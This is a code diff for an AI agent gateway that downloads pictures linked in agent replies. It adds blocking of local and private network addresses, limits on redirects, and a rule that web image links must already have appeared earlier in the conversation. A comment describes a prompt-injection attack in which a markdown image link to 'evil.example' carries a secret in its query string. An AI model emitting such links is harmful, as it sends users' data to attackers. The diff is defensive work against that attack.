@@ -1,5 +1,6 @@
 import { execFile } from 'node:child_process';
 import { createHash, randomUUID } from 'node:crypto';
+import { lookup } from 'node:dns';
 import {
 	closeSync,
 	createReadStream,
@@ -16,11 +17,13 @@ import {
 	statSync,
 	utimesSync
 } from 'node:fs';
-import { homedir } from 'node:os';
+import { get as httpGet, type IncomingMessage } from 'node:http';
+import { get as httpsGet } from 'node:https';
+import { BlockList, isIP, type LookupFunction } from 'node:net';
+import { homedir, networkInterfaces } from 'node:os';
 import { basename, extname, isAbsolute, join, resolve } from 'node:path';
-import { Readable } from 'node:stream';
+import type { Readable } from 'node:stream';
 import { pipeline } from 'node:stream/promises';
-import type { ReadableStream as WebReadableStream } from 'node:stream/web';
 import { fileURLToPath } from 'node:url';
 import { promisify } from 'node:util';
 import { and, eq } from 'drizzle-orm';
@@ -61,6 +64,7 @@ export type DisplayMedia =
 export const MAX_MEDIA_BYTES = 100 * 1024 * 1024;
 const MAX_PER_REPLY = 30;
 const FETCH_TIMEOUT_MS = 30_000;
+const MAX_REDIRECTS = 5;
 const CONVERT_TIMEOUT_MS = 60_000;
 /** Enough to find the size of a JPEG behind a large EXIF block. */
 const HEAD_BYTES = 1024 * 1024;
@@ -226,15 +230,152 @@ function nameFromHref(href: string): string {
 	return basename(href.replace(/[\\/]+$/, ''));
 }
 
-function describeError(err: unknown): string {
-	const e = err as { name?: string; code?: string; cause?: { code?: string; message?: string } };
-	if (e?.name === 'TimeoutError') return 'Downloading it took too long';
+function describeError(err: unknown, remote: boolean): string {
+	const e = err as { name?: string; code?: string; cause?: { name?: string } };
+	if (e?.name === 'TimeoutError' || e?.cause?.name === 'TimeoutError') {
+		return 'Downloading it took too long';
+	}
 	if (e?.name === 'AbortError') return 'Stopped before it was copied';
+	const message = err instanceof Error ? err.message : String(err);
+	if (remote) return `Couldn't download it (${e?.code ?? message})`;
 	if (e?.code === 'EACCES' || e?.code === 'EPERM') {
 		return 'btw is not allowed to read this file (on a Mac, check Full Disk Access)';
 	}
-	if (e?.cause) return `Couldn't download it (${e.cause.code ?? e.cause.message})`;
-	return err instanceof Error ? err.message : String(err);
+	return message;
+}
+
+/** A row for a target that wasn't copied, saying why. */
+function unavailable(
+	src: string,
+	name: string,
+	status: Exclude<MediaStatus, 'ok'>,
+	error: string
+): PreparedMedia {
+	return {
+		src,
+		status,
+		error,
+		name,
+		sha256: null,
+		mime: null,
+		bytes: null,
+		width: null,
+		height: null,
+		previewSha256: null
+	};
+}
+
+// --- web pictures ---
+
+/** Characters that would continue a URL, so a match followed by one is only part of a link. */
+const URL_CONTINUES = /[\w\-~%/?#=&+@]/;
+
+/**
+ * Whether the agent found a web link rather than wrote it: the link appears, whole, in what people
+ * wrote or commands printed earlier in the conversation (the rule of Anthropic's web fetch tool).
+ * The gateway downloads web pictures itself, so without this a prompt-injected reply could send
+ * what the agent read to any server just by showing `![](https://evil.example/p.png?d=<secret>)`.
+ * `earlierText` is read once, and only if the reply has a web picture.
+ */
+function linkFinder(earlierText: () => string): (href: string) => boolean {
+	let text: string | undefined;
+	return (href) => {
+		// Links as they appear in HTML (`&amp;`) and in escaped JSON (`\/`).
+		text ??= earlierText().replaceAll('&amp;', '&').replaceAll('\\/', '/');
+		for (let at = text.indexOf(href); at !== -1; at = text.indexOf(href, at + 1)) {
+			// Not the start of a longer link, cut short where the agent chose.
+			if (!URL_CONTINUES.test(text.charAt(at + href.length))) return true;
+		}
+		return false;
+	};
+}
+
+/** Loopback, private, shared (CGNAT, Tailscale), link-local, multicast and reserved networks. */
+const LOCAL_NETWORKS = new BlockList();
+for (const [network, prefix] of [
+	['0.0.0.0', 8],
+	['10.0.0.0', 8],
+	['100.64.0.0', 10],
+	['127.0.0.0', 8],
+	['169.254.0.0', 16],
+	['172.16.0.0', 12],
+	['192.168.0.0', 16],
+	['224.0.0.0', 3]
+] as const) {
+	LOCAL_NETWORKS.addSubnet(network, prefix, 'ipv4');
+}
+for (const [network, prefix] of [
+	['::', 96],
+	['fc00::', 7],
+	['fe80::', 10],
+	['fec0::', 10],
+	['ff00::', 8]
+] as const) {
+	LOCAL_NETWORKS.addSubnet(network, prefix, 'ipv6');
+}
+
+/**
+ * An address on this computer or the local network. Web pictures are never downloaded from one,
+ * so a link can't make the gateway open the router's pages or a service on this computer.
+ */
+function isLocalAddress(address: string): boolean {
+	// IPv4-mapped IPv6 addresses (`::ffff:127.0.0.1`) are checked against the IPv4 networks.
+	if (LOCAL_NETWORKS.check(address, isIP(address) === 6 ? 'ipv6' : 'ipv4')) return true;
+	// This computer's own public addresses (a Mac usually has a global IPv6 one) reach it too.
+	return Object.values(networkInterfaces()).some((list) =>
+		list?.some((iface) => iface.address === address)
+	);
+}
+
+class LocalAddressError extends Error {}
+
+/**
+ * DNS lookup for downloads that refuses local addresses. Node calls it for every connection it
+ * makes, so a host name can't pass the check and then resolve to somewhere else.
+ */
+const publicLookup: LookupFunction = (hostname, options, callback) => {
+	lookup(hostname, { ...options, all: true }, (err, addresses) => {
+		if (err) return callback(err, '');
+		if (addresses.some((a) => isLocalAddress(a.address))) {
+			return callback(new LocalAddressError(), '');
+		}
+		if (options.all) callback(null, addresses);
+		else callback(null, addresses[0].address, addresses[0].family);
+	});
+};
+
+/** GETs a web picture, following redirects, from public addresses only. */
+async function download(href: string, signal: AbortSignal): Promise<IncomingMessage> {
+	let url = new URL(href);
+	for (let redirects = 0; ; redirects++) {
+		// Node doesn't look up an IP address, so those are checked here.
+		const host = url.hostname.replace(/^\[(.*)\]$/, '$1');
+		if (isIP(host) && isLocalAddress(host)) throw new LocalAddressError();
+		const get = url.protocol === 'https:' ? httpsGet : httpGet;
+		const res = await new Promise<IncomingMessage>((resolve, reject) => {
+			get(
+				url,
+				{
+					headers: {
+						accept: 'image/*,*/*;q=0.5',
+						'accept-encoding': 'identity',
+						'user-agent': 'btw-agent'
+					},
+					lookup: publicLookup,
+					// A fresh connection, never one another request left open.
+					agent: false,
+					signal
+				},
+				resolve
+			).on('error', reject);
+		});
+		const status = res.statusCode ?? 0;
+		const location = res.headers.location;
+		if (status < 300 || status >= 400 || !location) return res;
+		res.destroy();
+		if (redirects === MAX_REDIRECTS) throw new Error('too many redirects');
+		url = new URL(location, url);
+	}
 }
 
 const execFileAsync = promisify(execFile);
@@ -263,37 +404,26 @@ async function convertToJpeg(sha256: string, mime: string): Promise<string | nul
 
 async function copyOne(href: string, baseDir: string, signal: AbortSignal): Promise<PreparedMedia> {
 	let name = nameFromHref(href) || 'file';
-	const problem = (status: Exclude<MediaStatus, 'ok'>, error: string): PreparedMedia => ({
-		src: href,
-		status,
-		error,
-		name,
-		sha256: null,
-		mime: null,
-		bytes: null,
-		width: null,
-		height: null,
-		previewSha256: null
-	});
+	const problem = (status: Exclude<MediaStatus, 'ok'>, error: string) =>
+		unavailable(href, name, status, error);
 	const tooLarge = () => problem('too_large', `Larger than ${formatMegabytes(MAX_MEDIA_BYTES)}`);
 
+	const remote = isRemoteHref(href);
 	try {
 		let stored: { sha256: string; bytes: number };
-		const remote = isRemoteHref(href);
 		if (remote) {
-			const res = await fetch(href, {
-				signal: AbortSignal.any([signal, AbortSignal.timeout(FETCH_TIMEOUT_MS)]),
-				headers: { accept: 'image/*,*/*;q=0.5', 'user-agent': 'btw-agent' }
-			});
-			if (!res.ok || !res.body) {
-				await res.body?.cancel();
-				return problem('failed', `Couldn't download it (the server answered ${res.status})`);
+			const downloadSignal = AbortSignal.any([signal, AbortSignal.timeout(FETCH_TIMEOUT_MS)]);
+			const res = await download(href, downloadSignal);
+			const status = res.statusCode ?? 0;
+			if (status < 200 || status >= 300) {
+				res.destroy();
+				return problem('failed', `Couldn't download it (the server answered ${status})`);
 			}
-			if (Number(res.headers.get('content-length')) > MAX_MEDIA_BYTES) {
-				await res.body.cancel();
+			if (Number(res.headers['content-length']) > MAX_MEDIA_BYTES) {
+				res.destroy();
 				return tooLarge();
 			}
-			stored = await store(Readable.fromWeb(res.body as WebReadableStream), signal);
+			stored = await store(res, downloadSignal);
 		} else {
 			const file = findLocal(href, baseDir);
 			if (!file) return problem('missing', 'File not found');
@@ -339,19 +469,27 @@ async function copyOne(href: string, baseDir: string, signal: AbortSignal): Prom
 		};
 	} catch (err) {
 		if (err instanceof TooLargeError) return tooLarge();
-		return problem('failed', describeError(err));
+		if (err instanceof LocalAddressError) {
+			return problem(
+				'blocked',
+				"btw doesn't download pictures from this computer or the local network"
+			);
+		}
+		return problem('failed', describeError(err, remote));
 	}
 }
 
 /**
  * Copies the pictures and files that a reply's text links to. Runs before the reply is saved,
  * so the reply and its copies appear in the transcript together. Never throws: whatever can't
- * be copied gets a row that says why, and the chat shows that instead.
+ * be copied gets a row that says why, and the chat shows that instead. `earlierText`: what
+ * people wrote and commands printed before this reply, where web pictures' links must appear.
  */
 export async function copyReplyMedia(
 	texts: string[],
 	baseDir: string,
-	signal: AbortSignal
+	signal: AbortSignal,
+	earlierText: () => string
 ): Promise<PreparedMedia[]> {
 	let refs: string[];
 	try {
@@ -360,23 +498,28 @@ export async function copyReplyMedia(
 		console.error('[btw] reading the links in a reply failed:', err);
 		return [];
 	}
+	const wasFound = linkFinder(earlierText);
 	return Promise.all(
-		refs.map((href, i) =>
-			i < MAX_PER_REPLY
-				? copyOne(href, baseDir, signal)
-				: Promise.resolve<PreparedMedia>({
-						src: href,
-						status: 'failed',
-						error: `Only the first ${MAX_PER_REPLY} pictures and files of a reply are kept`,
-						name: nameFromHref(href) || 'file',
-						sha256: null,
-						mime: null,
-						bytes: null,
-						width: null,
-						height: null,
-						previewSha256: null
-					})
-		)
+		refs.map(async (href, i) => {
+			const name = nameFromHref(href) || 'file';
+			if (i >= MAX_PER_REPLY) {
+				return unavailable(
+					href,
+					name,
+					'failed',
+					`Only the first ${MAX_PER_REPLY} pictures and files of a reply are kept`
+				);
+			}
+			if (isRemoteHref(href) && !wasFound(href)) {
+				return unavailable(
+					href,
+					name,
+					'blocked',
+					'Web pictures are shown only when btw found the link on a page or in a message'
+				);
+			}
+			return copyOne(href, baseDir, signal);
+		})
 	);
 }
 
